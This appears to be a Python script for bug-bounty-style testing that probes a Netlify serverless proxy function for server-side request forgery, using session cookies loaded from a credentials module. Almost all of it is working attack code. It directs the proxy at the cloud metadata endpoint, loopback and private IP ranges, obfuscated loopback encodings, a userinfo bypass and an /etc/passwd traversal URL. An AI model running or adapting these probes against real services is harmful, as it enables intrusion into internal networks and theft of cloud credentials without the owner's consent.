# -*- coding: utf-8 -*-
# _bbh_ssrf1.py - probe bitbucket-self-hosted proxy fn for SSRF (url field control)
import sys, os, json, urllib.request, urllib.error

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _net_creds import COOKIE_A, COOKIE_B

FN = "https://app.netlify.com/.netlify/functions/bitbucket-self-hosted"

def req(method, url, cookie=None, body=None, timeout=30):
    r = urllib.request.Request(url, method=method)
    if cookie:
        r.add_header("Cookie", cookie)
    data = json.dumps(body).encode() if body is not None else None
    if body is not None:
        r.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(r, data=data, timeout=timeout) as resp:
            b = resp.read(80000)
            try:
                return resp.status, json.loads(b.decode("utf-8", "replace"))
            except Exception:
                return resp.status, b[:1500]
    except urllib.error.HTTPError as e:
        b = e.read(8000)
        try:
            return e.code, json.loads(b.decode("utf-8", "replace"))
        except Exception:
            return e.code, b[:800]
    except Exception as ex:
        return -1, str(ex)[:300]

def show(tag, s, d):
    if isinstance(d, bytes):
        d = d.decode("utf-8", "replace")
    if isinstance(d, str):
        print("%-36s -> %s %s" % (tag, s, d[:400]))
    else:
        print("%-36s -> %s %s" % (tag, s, json.dumps(d, ensure_ascii=False)[:400]))

def probe(tag, ck, url, method="GET", payload=None):
    body = {"url": url, "method": method, "token": "x", "payload": payload}
    s, d = req("POST", FN, cookie=ck, body=body)
    show(tag, s, d)

# anon first
probe("anon https example.com", None, "https://example.com/")
# B cookie controls
probe("B https example.com", COOKIE_B, "https://example.com/")
probe("B http example.com", COOKIE_B, "http://example.com/")
probe("B https api.netlify.com", COOKIE_B, "https://api.netlify.com/api/v1/sites?per_page=1")
# private targets
probe("B metadata", COOKIE_B, "http://169.254.169.254/latest/meta-data/")
probe("B 127.0.0.1:80", COOKIE_B, "http://127.0.0.1/")
probe("B 127.0.0.1:443", COOKIE_B, "https://127.0.0.1/")
probe("B 10.0.0.1:80", COOKIE_B, "http://10.0.0.1/")
probe("B 172.16.0.1:80", COOKIE_B, "http://172.16.0.1/")
probe("B 192.168.1.1:80", COOKIE_B, "http://192.168.1.1/")
probe("B v6 [::1]", COOKIE_B, "http://[::1]/")
# weird forms
probe("B hex 0x7f000001", COOKIE_B, "http://0x7f000001/")
probe("B int 2130706433", COOKIE_B, "http://2130706433/")
probe("B dot 127.0.0.1.nip.io", COOKIE_B, "http://127.0.0.1.nip.io/")
probe("B userinfo", COOKIE_B, "http://x@127.0.0.1/")
# file/gopher? see how method/path used
probe("B path traversal url", COOKIE_B, "https://example.com/../../etc/passwd")
